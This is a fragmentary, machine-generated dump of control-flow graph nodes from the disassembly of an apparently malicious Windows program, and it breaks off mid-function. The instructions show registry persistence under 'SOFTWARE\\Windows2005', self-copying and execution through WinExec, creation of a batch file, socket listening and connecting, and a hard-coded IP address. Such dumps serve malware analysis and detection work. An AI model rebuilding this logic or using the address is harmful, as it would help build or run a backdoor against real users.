+ start: 4204719
+ prev: []
+ instructions: 
+  4204719, ['push', 'ebp']
+  4204720, ['mov', 'ebp,esp']
+  4204722, ['push', 'esi']
+  4204723, ['push', 'ebx']
+  4204724, ['mov', 'ebx,esi']
+  4204726, ['dec', 'esi']
+  4204727, ['dec', 'esi']
+  4204728, ['mov', 'cl,1']
+  4204730, ['std']
+ next: [4204731]
+
+node :274
+node StartAddress(4201563) info:
+ start: 4201563
+ prev: []
+ instructions: 
+  4201563, ['push', 'ecx;s']
+  4201564, ['call', 'closesocket']
+ next: [4201569]
+
+node :275
+node StartAddress(4201538) info:
+ start: 4201538
+ prev: []
+ instructions: 
+  4201538, ['lea', 'eax,[ebp+ThreadId]']
+  4201541, ['push', 'eax;lpThreadId']
+  4201542, ['push', '0;dwCreationFlags']
+  4201544, ['push', 'ecx;lpParameter']
+  4201545, ['push', 'esi;lpStartAddress']
+  4201546, ['push', '0;dwStackSize']
+  4201548, ['push', '0;lpThreadAttributes']
+  4201550, ['call', 'CreateThread']
+  4201555, ['push', 'eax;hObject']
+  4201556, ['call', 'CloseHandle']
+  4201561, ['jmp', 'shortloc_401C61']
+ next: [4201569]
+
+node :276
+node StartAddress(4201471) info:
+ start: 4201471
+ prev: []
+ instructions: 
+  4201471, ['push', '10h;namelen']
+  4201473, ['lea', 'eax,[ebp+name]']
+  4201476, ['push', 'eax;name']
+  4201477, ['push', 'dwordptr[ebx];s']
+  4201479, ['call', 'bind']
+  4201484, ['or', 'eax,eax']
+  4201486, ['jz', 'shortloc_401C12']
+ next: [4201488, 4201490]
+
+node :277
+node sub_40183A(4200666) info:
+ start: 4200666
+ prev: []
+ instructions: 
+  4200666, ['call', 'GetCommandLineA']
+ next: [4200671]
+
+node :278
+node sub_4028AF(4204773) info:
+ start: 4204773
+ prev: []
+ instructions: 
+  4204773, ['or', 'al,al']
+  4204775, ['jnz', 'shortloc_4028F4']
+ next: [4204777, 4204788]
+
+node :279
+node sub_40298F(4205133) info:
+ start: 4205133
+ prev: []
+ instructions: 
+  4205133, ['lea', 'eax,[ebp+String]']
+  4205139, ['push', 'eax']
+  4205140, ['call', '[ebp+arg_8]']
+ next: [4205143]
+
+node :280
+node sub_4028FD(4204849) info:
+ start: 4204849
+ prev: []
+ instructions: 
+  4204849, ['or', 'al,al']
+  4204851, ['jnz', 'shortloc_40293F']
+ next: [4204853, 4204863]
+
+node :281
+node sub_401CC1(4201665) info:
+ start: 4201665
+ prev: []
+ instructions: 
+  4201665, ['push', 'ebp']
+  4201666, ['mov', 'ebp,esp']
+  4201668, ['add', 'esp,0FFFFFFF8h']
+  4201671, ['push', '248h;dwBytes']
+  4201676, ['push', '40h;uFlags']
+  4201678, ['call', 'GlobalAlloc']
+  4201683, ['mov', '[ebp+pFixedInfo],eax']
+  4201686, ['mov', '[ebp+pOutBufLen],248h']
+  4201693, ['lea', 'eax,[ebp+pOutBufLen]']
+  4201696, ['push', 'eax;pOutBufLen']
+  4201697, ['push', '[ebp+pFixedInfo];pFixedInfo']
+  4201700, ['call', 'GetNetworkParams']
+  4201705, ['cmp', 'eax,6Fh']
+  4201708, ['jnz', 'shortloc_401D03']
+ next: [4201710, 4201731]
+
+node :282
+node sub_402D2C(4205868) info:
+ start: 4205868
+ prev: []
+ instructions: 
+  4205868, ['push', '0;dwReserved']
+  4205870, ['push', '0;lpdwFlags']
+  4205872, ['call', 'InternetGetConnectedState']
+  4205877, ['or', 'eax,eax']
+  4205879, ['jz', 'shortloc_402D3A']
+ next: [4205881, 4205882]
+
+node :283
+node sub_4028AF(4204777) info:
+ start: 4204777
+ prev: []
+ instructions: 
+  4204777, ['or', 'cl,cl']
+  4204779, ['jz', 'shortloc_4028F4']
+ next: [4204781, 4204788]
+
+node :284
+node sub_4028FD(4204853) info:
+ start: 4204853
+ prev: []
+ instructions: 
+  4204853, ['or', 'cl,cl']
+  4204855, ['jz', 'shortloc_40293F']
+ next: [4204857, 4204863]
+
+node :285
+node sub_401543(4199819) info:
+ start: 4199819
+ prev: []
+ instructions: 
+  4199819, ['mov', 'eax,[eax+4]']
+  4199822, ['jmp', 'shortloc_401578']
+ next: [4199800]
+
+node :286
+node sub_401543(4199798) info:
+ start: 4199798
+ prev: []
+ instructions: 
+  4199798, ['mov', 'eax,[eax]']
+ next: [4199800]
+
+node :287
+node sub_4019D4(4200960) info:
+ start: 4200960
+ prev: []
+ instructions: 
+  4200960, ['push', '0;flags']
+  4200962, ['push', 'ecx;len']
+  4200963, ['lea', 'eax,[ebp+buf]']
+  4200966, ['push', 'eax;buf']
+  4200967, ['push', '[ebp+s];s']
+  4200970, ['call', 'recv']
+  4200975, ['test', 'eax,eax']
+  4200977, ['jle', 'shortloc_401A31']
+ next: [4200979, 4201009]
+
+node :288
+node sub_401159(4198763) info:
+ start: 4198763
+ prev: []
+ instructions: 
+  4198763, ['add', 'dl,6']
+ next: [4198766]
+
+node :289
+node start(4207082) info:
+ start: 4207082
+ prev: []
+ instructions: 
+  4207082, ['jmp', 'shortloc_4031EF']
+ next: [4207087]
+
+node :290
+node start(4207087) info:
+ start: 4207087
+ prev: []
+ instructions: 
+  4207087, ['push', '3E8h;dwMilliseconds']
+  4207092, ['call', 'Sleep']
+  4207097, ['jmp', 'shortloc_4031EF']
+ next: [4207087]
+
+node :291
+node sub_401543(4199804) info:
+ start: 4199804
+ prev: []
+ instructions: 
+  4199804, ['mov', 'edx,eax']
+  4199806, ['mov', 'ecx,[eax]']
+  4199808, ['cmp', 'ecx,[ebp+arg_8]']
+  4199811, ['jnz', 'shortloc_40158B']
+ next: [4199813, 4199819]
+
+node :292
+node sub_401543(4199747) info:
+ start: 4199747
+ prev: []
+ instructions: 
+  4199747, ['push', 'ebp']
+  4199748, ['mov', 'ebp,esp']
+  4199750, ['mov', 'eax,[ebp+arg_8]']
+  4199753, ['xor', 'edx,edx']
+  4199755, ['mov', 'ecx,[ebp+arg_4]']
+  4199758, ['div', 'ecx']
+  4199760, ['shl', 'edx,2']
+  4199763, ['mov', 'eax,[ebp+arg_0]']
+  4199766, ['mov', 'eax,[eax]']
+  4199768, ['add', 'eax,edx']
+  4199770, ['cmp', 'dwordptr[eax],0']
+  4199773, ['jnz', 'shortloc_401576']
+ next: [4199775, 4199798]
+
+node :293
+node sub_4019D4(4200979) info:
+ start: 4200979
+ prev: []
+ instructions: 
+  4200979, ['sub', 'ebx,eax']
+  4200981, ['mov', 'edx,[ebp+arg_4]']
+  4200984, ['mov', 'edx,[edx]']
+  4200986, ['push', '0']
+  4200988, ['push', 'eax']
+  4200989, ['lea', 'eax,[ebp+buf]']
+  4200992, ['push', 'eax']
+  4200993, ['push', '[ebp+arg_4]']
+  4200996, ['call', 'dwordptr[edx+10h]']
+  4200999, ['cmp', '[ebp+arg_10],0']
+  4201003, ['jz', 'shortloc_401A2F']
+ next: [4201005, 4201007]
+
+node :294
+node sub_401A3D(4201075) info:
+ start: 4201075
+ prev: []
+ instructions: 
+  4201075, ['mov', 'edx,[ebp+arg_4]']
+  4201078, ['mov', 'edx,[edx]']
+  4201080, ['push', '0']
+  4201082, ['push', '1']
+  4201084, ['lea', 'eax,[ebp+buf]']
+  4201087, ['push', 'eax']
+  4201088, ['push', '[ebp+arg_4]']
+  4201091, ['call', 'dwordptr[edx+10h]']
+  4201094, ['push', '[ebp+arg_4]']
+  4201097, ['call', 'sub_40142B']
+  4201102, ['cmp', 'eax,[ebp+arg_8]']
+  4201105, ['jb', 'shortloc_401A95']
+ next: [4201107, 4201109]
+
+node :295
+node sub_4025AF(4204039) info:
+ start: 4204039
+ prev: []
+ instructions: 
+  4204039, ['leave']
+  4204040, ['retn', '10h']
+ next: []
+
+node :296
+node sub_401CC1(4201747) info:
+ start: 4201747
+ prev: []
+ instructions: 
+  4201747, ['mov', 'eax,[ebp+pFixedInfo]']
+  4201750, ['lea', 'eax,[eax+110h]']
+  4201756, ['push', 'eax;lpString2']
+  4201757, ['push', 'offsetcp;"217.5.97.137"']
+  4201762, ['call', 'lstrcpyA']
+ next: [4201767]
+
+node :297
+node sub_401B2A(4201283) info:
+ start: 4201283
+ prev: []
+ instructions: 
+  4201283, ['jmp', 'shortloc_401BA5']
+ next: [4201381]
+
+node :298
+node sub_40183A(4200740) info:
+ start: 4200740
+ prev: []
+ instructions: 
+  4200740, ['call', 'sub_4017E1']
+  4200745, ['or', 'eax,eax']
+  4200747, ['jz', 'shortloc_401937']
+ next: [4200749, 4200759]
+
+node :299
+node sub_40193E(4200782) info:
+ start: 4200782
+ prev: []
+ instructions: 
+  4200782, ['push', '[ebp+cp];name']
+  4200785, ['call', 'gethostbyname']
+  4200790, ['or', 'eax,eax']
+  4200792, ['jnz', 'shortloc_401961']
+ next: [4200794, 4200801]
+
+node :300
+node sub_40183A(4200698) info:
+ start: 4200698
+ prev: []
+ instructions: 
+  4200698, ['push', '0;bFailIfExists']
+  4200700, ['push', 'offsetNewFileName;lpNewFileName']
+  4200705, ['push', 'offsetExistingFileName;lpExistingFileName']
+  4200710, ['call', 'CopyFileA']
+  4200715, ['or', 'eax,eax']
+  4200717, ['jz', 'shortloc_40191B']
+ next: [4200719, 4200731]
+
+node :301
+node sub_401B2A(4201317) info:
+ start: 4201317
+ prev: []
+ instructions: 
+  4201317, ['mov', 'eax,[ebp+arg_4]']
+  4201320, ['jmp', 'shortloc_401B89']
+ next: [4201353]
+
+node :302
+node sub_401184(4198886) info:
+ start: 4198886
+ prev: []
+ instructions: 
+  4198886, ['inc', 'eax']
+  4198887, ['push', 'offsetString2;"a.bat"']
+  4198892, ['push', 'eax;lpString1']
+  4198893, ['call', 'lstrcpyA']
+  4198898, ['push', '0;hTemplateFile']
+  4198900, ['push', '0;dwFlagsAndAttributes']
+  4198902, ['push', '2;dwCreationDisposition']
+  4198904, ['push', '0;lpSecurityAttributes']
+  4198906, ['push', '3;dwShareMode']
+  4198908, ['push', '0C0000000h;dwDesiredAccess']
+  4198913, ['push', '[ebp+lpString1];lpFileName']
+  4198916, ['call', 'CreateFileA']
+  4198921, ['mov', '[ebp+hFile],eax']
+  4198924, ['inc', 'eax']
+  4198925, ['jz', 'shortloc_40126B']
+ next: [4198927, 4199019]
+
+node :303
+node sub_402105(4202757) info:
+ start: 4202757
+ prev: []
+ instructions: 
+  4202757, ['push', 'ebp']
+  4202758, ['mov', 'ebp,esp']
+  4202760, ['add', 'esp,0FFFFFFF8h']
+  4202763, ['mov', '[ebp+var_8],0']
+  4202770, ['push', '[ebp+arg_0]']
+  4202773, ['call', 'sub_401473']
+  4202778, ['mov', 'edx,[ebp+arg_0]']
+  4202781, ['mov', 'edx,[edx]']
+  4202783, ['lea', 'eax,[ebp+var_4]']
+  4202786, ['push', 'eax']
+  4202787, ['push', '3']
+  4202789, ['lea', 'eax,[ebp+var_8]']
+  4202792, ['push', 'eax']
+  4202793, ['push', '[ebp+arg_0]']
+  4202796, ['call', 'dwordptr[edx+0Ch]']
+  4202799, ['cmp', '[ebp+var_4],3']
+  4202803, ['jb', 'shortloc_40213A']
+ next: [4202805, 4202810]
+
+node :304
+node sub_402BD5(4205706) info:
+ start: 4205706
+ prev: []
+ instructions: 
+  4205706, ['push', '[ebp+hFindFile];hFindFile']
+  4205709, ['call', 'FindClose']
+ next: [4205714]
+
+node :305
+node StartAddress(4201576) info:
+ start: 4201576
+ prev: []
+ instructions: 
+  4201576, ['push', 'dwordptr[ebx];s']
+  4201578, ['call', 'closesocket']
+  4201583, ['mov', 'dwordptr[ebx],0']
+ next: [4201589]
+
+node :306
+node sub_401486(4199558) info:
+ start: 4199558
+ prev: []
+ instructions: 
+  4199558, ['push', 'ebp']
+  4199559, ['mov', 'ebp,esp']
+  4199561, ['add', 'esp,0FFFFFFF8h']
+  4199564, ['lea', 'edx,[ebp+var_8]']
+  4199567, ['mov', 'dwordptr[edx],0']
+  4199573, ['mov', 'dwordptr[edx+4],0']
+  4199580, ['push', '[ebp+arg_0]']
+  4199583, ['call', 'sub_401473']
+  4199588, ['mov', 'edx,[ebp+arg_0]']
+  4199591, ['mov', 'edx,[edx]']
+  4199593, ['push', '[ebp+var_4]']
+  4199596, ['push', '[ebp+var_8]']
+  4199599, ['push', '[ebp+arg_0]']
+  4199602, ['call', 'dwordptr[edx+18h]']
+  4199605, ['leave']
+  4199606, ['retn', '4']
+ next: []
+
+node :307
+node sub_402506(4203782) info:
+ start: 4203782
+ prev: []
+ instructions: 
+  4203782, ['push', 'ebp']
+  4203783, ['mov', 'ebp,esp']
+  4203785, ['add', 'esp,0FFFFFF24h']
+  4203791, ['lea', 'eax,[ebp+SystemTime]']
+  4203794, ['push', 'eax;lpSystemTime']
+  4203795, ['call', 'GetLocalTime']
+  4203800, ['push', '1Eh;cchDate']
+  4203802, ['lea', 'eax,[ebp+DateStr]']
+  4203805, ['push', 'eax;lpDateStr']
+  4203806, ['push', 'offsetFormat;"ddd\',\'ddMMMyyyy"']
+  4203811, ['lea', 'eax,[ebp+SystemTime]']
+  4203814, ['push', 'eax;lpDate']
+  4203815, ['push', '0;dwFlags']
+  4203817, ['push', '9;Locale']
+  4203819, ['call', 'GetDateFormatA']
+  4203824, ['lea', 'eax,[ebp+DateStr]']
+  4203827, ['push', 'eax;lpString2']
+  4203828, ['push', '[ebp+lpString1];lpString1']
+  4203831, ['call', 'lstrcpyA']
+  4203836, ['push', '1Eh;cchTime']
+  4203838, ['lea', 'eax,[ebp+DateStr]']
+  4203841, ['push', 'eax;lpTimeStr']
+  4203842, ['push', 'offsetaHhMmSs;"HH:mm:ss"']
+  4203847, ['lea', 'eax,[ebp+SystemTime]']
+  4203850, ['push', 'eax;lpTime']
+  4203851, ['push', '8;dwFlags']
+  4203853, ['push', '9;Locale']
+  4203855, ['call', 'GetTimeFormatA']
+  4203860, ['lea', 'eax,[ebp+DateStr]']
+  4203863, ['push', 'eax;lpString2']
+  4203864, ['push', '[ebp+lpString1];lpString1']
+  4203867, ['call', 'lstrcatA']
+  4203872, ['lea', 'eax,[ebp+TimeZoneInformation]']
+  4203878, ['push', 'eax;lpTimeZoneInformation']
+  4203879, ['call', 'GetTimeZoneInformation']
+  4203884, ['mov', 'eax,[ebp+TimeZoneInformation.Bias]']
+  4203890, ['neg', 'eax']
+  4203892, ['cdq']
+  4203893, ['mov', 'ecx,3Ch']
+  4203898, ['idiv', 'ecx']
+  4203900, ['test', 'edx,edx']
+  4203902, ['jge', 'shortloc_402582']
+ next: [4203904, 4203906]
+
+node :308
+node sub_401977(4200823) info:
+ start: 4200823
+ prev: []
+ instructions: 
+  4200823, ['push', 'ebp']
+  4200824, ['mov', 'ebp,esp']
+  4200826, ['add', 'esp,0FFFFFEF4h']
+  4200832, ['push', '[ebp+arg_4]']
+  4200835, ['pop', '[ebp+timeout.tv_sec]']
+  4200841, ['mov', '[ebp+timeout.tv_usec],0']
+  4200851, ['mov', '[ebp+readfds.fd_count],1']
+  4200861, ['lea', 'eax,[ebp+readfds.fd_array]']
+  4200867, ['push', '[ebp+arg_0]']
+  4200870, ['pop', 'dwordptr[eax]']
+  4200872, ['lea', 'eax,[ebp+timeout]']
+  4200878, ['push', 'eax;timeout']
+  4200879, ['push', '0;exceptfds']
+  4200881, ['push', '0;writefds']
+  4200883, ['lea', 'eax,[ebp+readfds]']
+  4200889, ['push', 'eax;readfds']
+  4200890, ['push', '0;nfds']
+  4200892, ['call', 'select']
+  4200897, ['cmp', 'eax,0FFFFFFFFh']
+  4200900, ['jz', 'shortloc_4019CA']
+ next: [4200902, 4200906]
+
+node :309
+node sub_4021D1(4203590) info:
+ start: 4203590
+ prev: []
+ instructions: 
+  4203590, ['push', '[ebp+var_4]']
+  4203593, ['call', 'sub_4013EA']
+  4203598, ['push', '[ebp+buf];hMem']
+  4203601, ['call', 'GlobalFree']
+  4203606, ['push', '[ebp+ppstm]']
+  4203609, ['call', 'sub_4013EA']
+  4203614, ['push', '[ebp+var_C]']
+  4203617, ['call', 'sub_4013EA']
+  4203622, ['mov', 'eax,edi']
+  4203624, ['pop', 'ebx']
+  4203625, ['pop', 'edi']
+  4203626, ['pop', 'esi']
+  4203627, ['leave']
+  4203628, ['retn', '0Ch']
+ next: []
+
+node :310
+node sub_401000(4198420) info:
+ start: 4198420
+ prev: []
+ instructions: 
+  4198420, ['mov', 'ecx,[ebp+arg_4]']
+  4198423, ['and', 'ecx,3']
+  4198426, ['jecxz', 'shortloc_40101E']
+ next: [4198428, 4198430]
+
+node :311
+node sub_403100(4206973) info:
+ start: 4206973
+ prev: []
+ instructions: 
+  4206973, ['push', '[ebp+ppstm]']
+  4206976, ['call', 'sub_4013EA']
+  4206981, ['dec', 'dword_40536F']
+  4206987, ['xor', 'eax,eax']
+  4206989, ['pop', 'ebx']
+  4206990, ['pop', 'edi']
+  4206991, ['pop', 'esi']
+  4206992, ['leave']
+  4206993, ['retn', '4']
+ next: []
+
+node :312
+node sub_402816(4204674) info:
+ start: 4204674
+ prev: []
+ instructions: 
+  4204674, ['lea', 'eax,[ebp+ThreadId]']
+  4204677, ['push', 'eax;lpThreadId']
+  4204678, ['push', '0;dwCreationFlags']
+  4204680, ['push', 'ebx;lpParameter']
+  4204681, ['push', 'offsetsub_402782;lpStartAddress']
+  4204686, ['push', '0;dwStackSize']
+  4204688, ['push', '0;lpThreadAttributes']
+  4204690, ['call', 'CreateThread']
+  4204695, ['push', 'eax;hObject']
+  4204696, ['call', 'CloseHandle']
+ next: [4204701]
+
+node :313
+node sub_401B2A(4201336) info:
+ start: 4201336
+ prev: []
+ instructions: 
+  4201336, ['jmp', 'shortloc_401B89']
+ next: [4201353]
+
+node :314
+node sub_402BD5(4205714) info:
+ start: 4205714
+ prev: []
+ instructions: 
+  4205714, ['push', '[ebp+hMem];hMem']
+  4205717, ['call', 'LocalFree']
+  4205722, ['push', '[ebp+lpFindFileData];hMem']
+  4205725, ['call', 'LocalFree']
+  4205730, ['pop', 'edi']
+  4205731, ['leave']
+  4205732, ['retn', '8']
+ next: []
+
+node :315
+node sub_401B2A(4201353) info:
+ start: 4201353
+ prev: []
+ instructions: 
+  4201353, ['mov', 'dwordptr[ebp+name.sa_data+2],eax']
+  4201356, ['push', '10h;namelen']
+  4201358, ['lea', 'eax,[ebp+name]']
+  4201361, ['push', 'eax;name']
+  4201362, ['push', 'ebx;s']
+  4201363, ['call', 'connect']
+  4201368, ['cmp', 'eax,0FFFFFFFFh']
+  4201371, ['jnz', 'shortloc_401BA5']
+ next: [4201373, 4201381]
+
+node :316
+node inet_addr(4207382) info:
+ start: 4207382
+ prev: []
+ instructions: 
+  4207382, ['jmp', '__imp_inet_addr']
+ next: []
+
+node :317
+node sub_402E11(4206097) info:
+ start: 4206097
+ prev: []
+ instructions: 
+  4206097, ['push', 'ebp']
+  4206098, ['mov', 'ebp,esp']
+  4206100, ['add', 'esp,0FFFFFFFCh']
+  4206103, ['lea', 'eax,[ebp+ThreadId]']
+  4206106, ['push', 'eax;lpThreadId']
+  4206107, ['push', '0;dwCreationFlags']
+  4206109, ['push', '0;lpParameter']
+  4206111, ['push', 'offsetsub_402DF7;lpStartAddress']
+  4206116, ['push', '0;dwStackSize']
+  4206118, ['push', '0;lpThreadAttributes']
+  4206120, ['call', 'CreateThread']
+  4206125, ['push', 'eax;hObject']
+  4206126, ['call', 'CloseHandle']
+  4206131, ['leave']
+  4206132, ['retn']
+ next: []
+
+node :318
+node GlobalFree(4207244) info:
+ start: 4207244
+ prev: []
+ instructions: 
+  4207244, ['jmp', '__imp_GlobalFree']
+ next: []
+
+node :319
+node sub_401A3D(4201107) info:
+ start: 4201107
+ prev: []
+ instructions: 
+  4201107, ['jmp', 'shortloc_401A99']
+ next: [4201113]
+
+node :320
+node GetDriveTypeA(4207178) info:
+ start: 4207178
+ prev: []
+ instructions: 
+  4207178, ['jmp', '__imp_GetDriveTypeA']
+ next: []
+
+node :321
+node sub_402506(4203904) info:
+ start: 4203904
+ prev: []
+ instructions: 
+  4203904, ['neg', 'edx']
+ next: [4203906]
+
+node :322
+node sub_40142B(4199467) info:
+ start: 4199467
+ prev: []
+ instructions: 
+  4199467, ['push', 'ebp']
+  4199468, ['mov', 'ebp,esp']
+  4199470, ['add', 'esp,0FFFFFFF8h']
+  4199473, ['push', 'esi']
+  4199474, ['lea', 'esi,[ebp+var_8]']
+  4199477, ['mov', 'dwordptr[esi],0']
+  4199483, ['mov', 'dwordptr[esi+4],0']
+  4199490, ['mov', 'edx,[ebp+arg_0]']
+  4199493, ['mov', 'edx,[edx]']
+  4199495, ['lea', 'eax,[ebp+var_8]']
+  4199498, ['push', 'eax']
+  4199499, ['push', '2']
+  4199501, ['push', '[ebp+var_4]']
+  4199504, ['push', '[ebp+var_8]']
+  4199507, ['push', '[ebp+arg_0]']
+  4199510, ['call', 'dwordptr[edx+14h]']
+  4199513, ['mov', 'eax,[esi]']
+  4199515, ['pop', 'esi']
+  4199516, ['leave']
+  4199517, ['retn', '4']
+ next: []
+
+node :323
+node RegCloseKey(4207478) info:
+ start: 4207478
+ prev: []
+ instructions: 
+  4207478, ['jmp', '__imp_RegCloseKey']
+ next: []
+
+node :324
+node CoInitialize(4207418) info:
+ start: 4207418
+ prev: []
+ instructions: 
+  4207418, ['jmp', '__imp_CoInitialize']
+ next: []
+
+node :325
+node sub_402D2C(4205881) info:
+ start: 4205881
+ prev: []
+ instructions: 
+  4205881, ['retn']
+ next: []
+
+node :326
+node CreateFileMappingA(4207124) info:
+ start: 4207124
+ prev: []
+ instructions: 
+  4207124, ['jmp', '__imp_CreateFileMappingA']
+ next: []
+
+node :327
+node StrDupA(4207430) info:
+ start: 4207430
+ prev: []
+ instructions: 
+  4207430, ['jmp', '__imp_StrDupA']
+ next: []
+
+node :328
+node sub_402816(4204701) info:
+ start: 4204701
+ prev: []
+ instructions: 
+  4204701, ['inc', 'dwordptr[ebx]']
+  4204703, ['push', 'hMutex;hMutex']
+  4204709, ['call', 'ReleaseMutex']
+  4204714, ['pop', 'ebx']
+  4204715, ['leave']
+  4204716, ['retn', '0Ch']
+ next: []
+
+node :329
+node socket(4207412) info:
+ start: 4207412
+ prev: []
+ instructions: 
+  4207412, ['jmp', '__imp_socket']
+ next: []
+
+node :330
+node sub_401AA0(4201246) info:
+ start: 4201246
+ prev: []
+ instructions: 
+  4201246, ['xor', 'eax,eax']
+  4201248, ['leave']
+  4201249, ['retn', '10h']
+ next: []
+
+node :331
+node sub_401473(4199539) info:
+ start: 4199539
+ prev: []
+ instructions: 
+  4199539, ['push', 'ebp']
+  4199540, ['mov', 'ebp,esp']
+  4199542, ['push', '0']
+  4199544, ['push', '0']
+  4199546, ['push', '[ebp+arg_0]']
+  4199549, ['call', 'sub_4013FC']
+  4199554, ['leave']
+  4199555, ['retn', '4']
+ next: []
+
+node :332
+node sub_402CD8(4205856) info:
+ start: 4205856
+ prev: []
+ instructions: 
+  4205856, ['push', '[ebp+lpBuffer];hMem']
+  4205859, ['call', 'GlobalFree']
+  4205864, ['pop', 'ebx']
+  4205865, ['pop', 'esi']
+  4205866, ['leave']
+  4205867, ['retn']
+ next: []
+
+node :333
+node StartAddress(4201589) info:
+ start: 4201589
+ prev: []
+ instructions: 
+  4201589, ['xor', 'eax,eax']
+  4201591, ['pop', 'ebx']
+  4201592, ['pop', 'esi']
+  4201593, ['leave']
+  4201594, ['retn', '4']
+ next: []
+
+node :334
+node sub_4013D7(4199383) info:
+ start: 4199383
+ prev: []
+ instructions: 
+  4199383, ['push', 'ebp']
+  4199384, ['mov', 'ebp,esp']
+  4199386, ['push', '[ebp+ppstm];ppstm']
+  4199389, ['push', '1;fDeleteOnRelease']
+  4199391, ['push', '0;hGlobal']
+  4199393, ['call', 'CreateStreamOnHGlobal']
+  4199398, ['leave']
+  4199399, ['retn', '4']
+ next: []
+
+node :335
+node sub_40193E(4200801) info:
+ start: 4200801
+ prev: []
+ instructions: 
+  4200801, ['mov', 'eax,[eax+0Ch]']
+  4200804, ['or', 'eax,eax']
+  4200806, ['jnz', 'shortloc_40196F']
+ next: [4200808, 4200815]
+
+node :336
+node sub_4013EA(4199402) info:
+ start: 4199402
+ prev: []
+ instructions: 
+  4199402, ['push', 'ebp']
+  4199403, ['mov', 'ebp,esp']
+  4199405, ['mov', 'edx,[ebp+arg_0]']
+  4199408, ['mov', 'edx,[edx]']
+  4199410, ['push', '[ebp+arg_0]']
+  4199413, ['call', 'dwordptr[edx+8]']
+  4199416, ['leave']
+  4199417, ['retn', '4']
+ next: []
+
+node :337
+node sub_40183A(4200524) info:
+ start: 4200524
+ prev: []
+ instructions: 
+  4200524, ['push', '0;uExitCode']
+  4200526, ['call', 'ExitProcess']
+ next: []
+
+node :338
+node sub_402105(4202805) info:
+ start: 4202805
+ prev: []
+ instructions: 
+  4202805, ['mov', 'eax,[ebp+var_8]']
+  4202808, ['jmp', 'shortlocret_40213C']
+ next: [4202812]
+
+node :339
+node InternetOpenA(4207466) info:
+ start: 4207466
+ prev: []
+ instructions: 
+  4207466, ['jmp', '__imp_InternetOpenA']
+ next: []
+
+node :340
+node sub_4015AA(4199942) info:
+ start: 4199942
+ prev: []
+ instructions: 
+  4199942, ['push', '8;cbData']
+  4199944, ['push', 'offsetData;lpData']
+  4199949, ['push', '1;dwType']
+  4199951, ['push', '0;Reserved']
+  4199953, ['push', 'offsetValueName;"gsed"']
+  4199958, ['push', '[ebp+phkResult];hKey']
+  4199961, ['call', 'RegSetValueExA']
+ next: [4199966]
+
+node :341
+node InternetGetConnectedState(4207460) info:
+ start: 4207460
+ prev: []
+ instructions: 
+  4207460, ['jmp', '__imp_InternetGetConnectedState']
+ next: []
+
+node :342
+node listen(4207388) info:
+ start: 4207388
+ prev: []
+ instructions: 
+  4207388, ['jmp', '__imp_listen']
+ next: []
+
+node :343
+node StrTrimA(4207448) info:
+ start: 4207448
+ prev: []
+ instructions: 
+  4207448, ['jmp', '__imp_StrTrimA']
+ next: []
+
+node :344
+node sub_40166E(4200134) info:
+ start: 4200134
+ prev: []
+ instructions: 
+  4200134, ['xor', 'eax,eax']
+  4200136, ['jmp', 'shortlocret_4016CD']
+ next: [4200141]
+
+node :345
+node sub_4017E1(4200417) info:
+ start: 4200417
+ prev: []
+ instructions: 
+  4200417, ['push', 'ebp']
+  4200418, ['mov', 'ebp,esp']
+  4200420, ['add', 'esp,0FFFFFFF0h']
+  4200423, ['push', 'ebx']
+  4200424, ['lea', 'eax,[ebp+phkResult]']
+  4200427, ['push', 'eax;phkResult']
+  4200428, ['push', 'offsetSubKey;"SOFTWARE\\\\Windows2005"']
+  4200433, ['push', '80000001h;hKey']
+  4200438, ['call', 'RegCreateKeyA']
+  4200443, ['mov', '[ebp+cbData],4']
+  4200450, ['lea', 'eax,[ebp+cbData]']
+  4200453, ['push', 'eax;lpcbData']
+  4200454, ['lea', 'eax,[ebp+Data]']
+  4200457, ['push', 'eax;lpData']
+  4200458, ['lea', 'eax,[ebp+Type]']
+  4200461, ['push', 'eax;lpType']
+  4200462, ['push', '0;lpReserved']
+  4200464, ['push', 'offsetaFr1n;"fr1n"']
+  4200469, ['push', '[ebp+phkResult];hKey']
+  4200472, ['call', 'RegQueryValueExA']
+  4200477, ['or', 'eax,eax']
+  4200479, ['jz', 'shortloc_401828']
+ next: [4200481, 4200488]
+
+node :346
+node sub_401B2A(4201334) info:
+ start: 4201334
+ prev: []
+ instructions: 
+  4201334, ['jmp', 'shortloc_401B9D']
+ next: [4201373]
+
+node :347
+node sub_402AE7(4205287) info:
+ start: 4205287
+ prev: []
+ instructions: 
+  4205287, ['push', '1388h']
+  4205292, ['push', 'offsetword_407D6E']
+  4205297, ['call', 'sub_401529']
+  4205302, ['lea', 'eax,byte_407D72']
+  4205308, ['mov', 'byteptr[eax],0']
+  4205311, ['retn']
+ next: []
+
+node :348
+node sub_4012AF(4199275) info:
+ start: 4199275
+ prev: []
+ instructions: 
+  4199275, ['mov', 'edx,edi']
+  4199277, ['add', 'edx,630h']
+  4199283, ['mov', 'ebx,[edx]']
+  4199285, ['xor', 'eax,ebx']
+  4199287, ['and', 'ecx,1']
+  4199290, ['or', 'ecx,ecx']
+  4199292, ['jz', 'shortloc_401383']
+ next: [4199294, 4199299]
+
+node :349
+node sub_40183A(4200749) info:
+ start: 4200749
+ prev: []
+ instructions: 
+  4200749, ['mov', 'dword_40536B,1']
+ next: [4200759]
+
+node :350
+node sub_4019D4(4201005) info:
+ start: 4201005
+ prev: []
+ instructions: 
+  4201005, ['jmp', 'shortloc_401A31']
+ next: [4201009]
+
+node :351
+node sub_402E35(4206804) info:
+ start: 4206804
+ prev: []
+ instructions: 
+  4206804, ['jmp', 'shortloc_4030E4']
+ next: [4206820]
+
+node :352
+node sub_40183A(4200719) info:
+ start: 4200719
+ prev: []
+ instructions: 
+  4200719, ['push', '0;uCmdShow']
+  4200721, ['push', 'offsetNewFileName;lpCmdLine']
+  4200726, ['call', 'WinExec']
+ next: [4200731]
+
+node :353
+node sub_401B2A(4201351) info:
+ start: 4201351
+ prev: []
+ instructions: 
+  4201351, ['jmp', 'shortloc_401B9D']
+ next: [4201373]
+
+node :354
+node sub_402105(4202810) info:
+ start: 4202810
+ prev: []
+ instructions: 
+  4202810, ['xor', 'eax,eax']
+ next: [4202812]
+
+node :355
+node sub_401977(4200902) info:
+ start: 4200902
+ prev: []
+ instructions: 
+  4200902, ['or', 'eax,eax']
+  4200904, ['jnz', 'shortloc_4019CE']
+ next: [4200906, 4200910]
+
+node :356
+node sub_402947(4204871) info:
+ start: 4204871
+ prev: []
+ instructions: 
+  4204871, ['push', 'ebp']
+  4204872, ['mov', 'ebp,esp']
+  4204874, ['mov', 'eax,[ebp+arg_4]']
+  4204877, ['sub', 'eax,[ebp+arg_0]']
+  4204880, ['cmp', 'eax,2']
